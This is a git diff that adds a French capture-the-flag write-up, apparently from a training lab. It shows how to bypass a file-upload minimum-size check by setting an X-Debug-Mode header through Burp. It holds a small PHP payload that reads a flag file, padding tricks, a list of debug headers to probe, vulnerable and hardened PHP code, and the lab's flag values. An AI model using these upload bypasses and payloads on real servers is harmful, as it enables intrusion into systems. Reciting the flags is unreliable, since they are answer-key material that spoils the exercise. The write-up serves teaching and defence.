@@ -774,6 +774,270 @@ printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\n<?php readfile("FLAG_3.txt") ?>' > ima
 
 ---
 
+## Task 4 : Bypass de la restriction de taille de fichier via Debug Mode
+
+### Objectif
+Bypasser la restriction de taille minimale de fichier (80KB) imposée par le serveur en exploitant un header de debug caché dans la réponse HTTP.
+
+### Vulnérabilité
+Le serveur impose une taille minimale de **80KB** pour les uploads, ce qui empêche l'upload de petits fichiers PHP malveillants. Cependant, un header de debug `X-Debug-Mode` dans la réponse HTTP révèle un backdoor qui permet de bypasser cette restriction.
+
+### Prérequis
+- Burp Suite configuré et fonctionnel
+- Navigateur configuré pour utiliser Burp comme proxy (127.0.0.1:8080)
+- Compréhension des headers HTTP personnalisés
+
+### Concept : Header de Debug comme Backdoor
+
+Les développeurs laissent parfois des **headers de debug** dans les réponses HTTP qui peuvent révéler des fonctionnalités cachées ou des modes de bypass. Ces headers peuvent être :
+- `X-Debug-Mode: True/False`
+- `X-Admin-Mode: 0/1`
+- `X-Bypass-Validation: enabled/disabled`
+
+L'idée est d'**inspecter les headers de réponse** et de les **réutiliser dans la requête** pour activer un mode spécial.
+
+### Méthodologie simplifiée (Approche directe)
+
+💡 **Note** : Le header `X-Debug-Mode: True` bypass **TOUTES** les validations du serveur. Il n'est donc **pas nécessaire** de créer un fichier PHP spécifique - n'importe quel fichier uploadé avec ce header sera accepté et le flag s'affichera directement en accédant au fichier!
+
+#### Étape 1 : Identifier la restriction de taille
+
+1. **Configure Burp Suite** :
+   - Lance Burp Suite
+   - Configure Firefox pour utiliser le proxy (127.0.0.1:8080)
+   - Active **Proxy → Intercept → "Intercept is on"**
+
+2. **Navigue vers** : `http://test-s3.web0x05.hbtn/task4`
+
+3. **Essaie d'uploader n'importe quel petit fichier** (image des tasks précédentes, etc.)
+   - Le site affiche : **"Taille minimale : 80KB"** ❌
+
+#### Étape 2 : Découvrir le header de debug dans la réponse
+
+Dans **Burp Suite**, examine la **RÉPONSE HTTP** de la page task4 :
+- Regarde les headers de la réponse
+- Cherche des headers personnalisés (commençant par `X-`)
+
+**Header trouvé dans la réponse** :
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Mon, 13 Oct 2025 14:18:14 GMT
+Content-Type: text/html; charset=utf-8
+X-Debug-Mode: False    ← BACKDOOR DÉCOUVERT!
+Content-Length: 494
+Connection: keep-alive
+```
+
+💡 **Idée** : Si `X-Debug-Mode: False` existe, essayons `X-Debug-Mode: True` dans la requête!
+
+#### Étape 3 : Exploiter le header X-Debug-Mode
+
+1. **Tente à nouveau l'upload** d'un petit fichier via Firefox
+2. **Burp intercepte la requête POST**
+3. **Copie-colle le header** `X-Debug-Mode: False` depuis la réponse
+4. **Ajoute-le dans les headers de la REQUÊTE** et change la valeur à `True`
+
+**Requête modifiée** :
+```http
+POST /api/task4/ HTTP/1.1
+Host: test-s3.web0x05.hbtn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://test-s3.web0x05.hbtn/task4
+X-Debug-Mode: True    ← AJOUTER CETTE LIGNE
+Content-Type: multipart/form-data; boundary=---------------------------xxxxx
+Content-Length: xxx
+Origin: http://test-s3.web0x05.hbtn
+Connection: keep-alive
+
+-----------------------------xxxxx
+Content-Disposition: form-data; name="file"; filename="[nom_du_fichier]"
+Content-Type: [type_du_fichier]
+
+[contenu du fichier uploadé]
+-----------------------------xxxxx--
+```
+
+5. **Forward** la requête
+6. **Désactive l'interception** : "Intercept is off"
+7. ✅ **Le fichier est accepté** malgré sa petite taille!
+
+#### Étape 4 : Récupérer le FLAG
+
+1. **Retourne sur Firefox** à la page task4
+2. **Clique sur le fichier uploadé** ou copie son lien
+3. **Ouvre le fichier dans le navigateur**
+4. 🚩 **Le FLAG s'affiche directement**
+
+**Alternative via curl** :
+```bash
+curl http://test-s3.web0x05.hbtn/static/upload/[nom_du_fichier]
+```
+
+### Résultat
+
+**FLAG récupéré** : `1be09c3673e1b0949058ce3e62fa00a6`
+
+**Fichier de sortie** : [4-flag.txt](4-flag.txt)
+
+```
+1be09c3673e1b0949058ce3e62fa00a6
+```
+
+### Méthode alternative (Plus complexe, pas nécessaire)
+
+Si tu veux créer un payload PHP spécifique à uploader :
+
+```bash
+# Créer un fichier PHP minimal
+echo -n '<?=readfile("FLAG_4.txt")?>' > mini.php
+
+# Uploader ce fichier avec le header X-Debug-Mode: True dans Burp
+# Puis accéder à : http://test-s3.web0x05.hbtn/static/upload/mini.php
+```
+
+**Note** : Cette méthode fonctionne aussi, mais elle est plus longue. L'approche simplifiée ci-dessus est plus rapide car le flag s'affiche directement sans avoir besoin de créer un fichier PHP spécifique.
+
+### Explication technique de la vulnérabilité
+
+#### 1. Restriction de taille minimale
+
+Le serveur implémente une validation inhabituelle : une **taille minimale** au lieu d'une taille maximale :
+
+```php
+// Validation côté serveur (vulnérable)
+$filesize = $_FILES['file']['size'];
+
+if ($filesize < 80000) { // 80KB minimum
+    die('Fichier trop petit! Minimum 80KB requis.');
+}
+
+// Sauvegarde du fichier
+move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
+```
+
+**Objectif de la restriction** : Empêcher l'upload de petits scripts PHP malveillants (souvent < 1KB).
+
+#### 2. Mode Debug activable via header
+
+Le serveur vérifie la présence d'un header `X-Debug-Mode` dans la requête :
+
+```php
+// Vérifier le mode debug
+$debug_mode = isset($_SERVER['HTTP_X_DEBUG_MODE']) && $_SERVER['HTTP_X_DEBUG_MODE'] === 'True';
+
+if ($debug_mode) {
+    // Mode debug : bypass toutes les validations
+    error_log("[DEBUG] File size validation bypassed");
+    // Pas de vérification de taille
+} else {
+    // Mode normal : vérifier la taille minimale
+    if ($filesize < 80000) {
+        die('Fichier trop petit!');
+    }
+}
+```
+
+**Problème de sécurité** :
+1. Le header `X-Debug-Mode: False` est révélé dans la réponse HTTP
+2. Un attaquant peut facilement deviner qu'il existe une valeur `True`
+3. Aucune authentification n'est requise pour activer le mode debug
+4. Le mode debug bypass TOUTES les validations
+
+#### 3. Headers HTTP personnalisés
+
+Les headers commençant par `X-` sont des **headers custom** (non-standards) :
+- `X-Debug-Mode`
+- `X-Admin-Panel`
+- `X-API-Key`
+- etc.
+
+**Bonnes pratiques violées** :
+- ❌ Ne jamais exposer des headers de debug en production
+- ❌ Ne jamais permettre l'activation de modes spéciaux sans authentification
+- ❌ Ne pas révéler l'existence de backdoors dans les réponses HTTP
+
+#### 4. Information Disclosure
+
+Le fait de révéler `X-Debug-Mode: False` dans la réponse est une forme d'**Information Disclosure** :
+- Révèle l'existence d'un mode debug
+- Indique qu'il peut être activé
+- Facilite grandement l'exploitation
+
+### Variantes et techniques similaires
+
+#### Variante 1 : Padding pour atteindre 80KB
+
+Si le header debug n'existait pas, on pourrait **ajouter du padding** :
+
+```bash
+# Créer un fichier de 80KB avec padding
+{
+  echo '<?=readfile("FLAG_4.txt")?>'
+  dd if=/dev/zero bs=1 count=81893  # Padding pour atteindre 80KB
+} > padded.php
+```
+
+**Problème** : Le PHP exécutera le code même avec le padding binaire après.
+
+#### Variante 2 : Commentaires PHP pour augmenter la taille
+
+```php
+<?=readfile("FLAG_4.txt")?>
+/*
+<?php
+// Padding avec des commentaires pour atteindre 80KB
+// <?php echo str_repeat("A", 80000); ?>
+*/
+```
+
+#### Variante 3 : Headers alternatifs à tester
+
+Autres headers de debug courants à essayer :
+- `X-Debug: true`
+- `X-Admin-Mode: 1`
+- `X-Bypass-Validation: enabled`
+- `X-Testing-Mode: on`
+- `X-Dev-Mode: true`
+
+### Protection recommandée
+
+```php
+// Code sécurisé
+// 1. Ne jamais exposer de headers de debug en production
+if (getenv('ENVIRONMENT') !== 'production') {
+    header('X-Debug-Mode: False'); // OK en dev/staging
+}
+
+// 2. Authentification requise pour le mode debug
+$debug_mode = false;
+if (isset($_SERVER['HTTP_X_DEBUG_MODE'])) {
+    // Vérifier un token secret
+    $debug_token = $_SERVER['HTTP_X_DEBUG_TOKEN'] ?? '';
+    if (hash_equals(getenv('DEBUG_TOKEN'), $debug_token)) {
+        $debug_mode = true;
+    }
+}
+
+// 3. Taille maximale ET minimale avec des limites raisonnables
+$filesize = $_FILES['file']['size'];
+if ($filesize < 100 || $filesize > 5000000) { // 100 bytes min, 5MB max
+    die('Taille de fichier invalide');
+}
+
+// 4. Validation du type MIME et contenu
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
+if (!in_array($mime, ['image/jpeg', 'image/png'])) {
+    die('Type de fichier non autorisé');
+}
+```
+
+---
+
 ## Résumé des vulnérabilités par tâche
 
 ### Task 1 : Validation client-side uniquement
@@ -791,6 +1055,12 @@ printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\n<?php readfile("FLAG_3.txt") ?>' > ima
 - Le serveur vérifie les magic numbers mais accepte les fichiers hybrides/polyglottes
 - Vulnérable à la null byte injection pour bypasser les filtres d'extension
 - Pas de vérification de l'intégrité complète du fichier (seulement les 8 premiers octets)
+
+### Task 4 : Restriction de taille minimale avec backdoor debug
+- Le serveur impose une taille minimale de 80KB pour les uploads
+- Header de debug `X-Debug-Mode: False` révélé dans la réponse HTTP
+- Pas d'authentification requise pour activer le mode debug
+- Le mode debug bypass toutes les validations de taille
 
 ### Comment se protéger ?
 
@@ -859,6 +1129,7 @@ printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\n<?php readfile("FLAG_3.txt") ?>' > ima
 | Task 1 | Bypass validation client-side | `1d38ded926706bc96695b2ec52263bfd` |
 | Task 2 | Null byte injection (caractères spéciaux) | `7e65f8b52e7958b351f66fe9ad4ae26d` |
 | Task 3 | Bypass magic numbers + null byte | `8b73b0afdd57fbd2d44dc384babd03a7` |
+| Task 4 | Bypass taille minimale via X-Debug-Mode | `1be09c3673e1b0949058ce3e62fa00a6` |
 
 ---
 
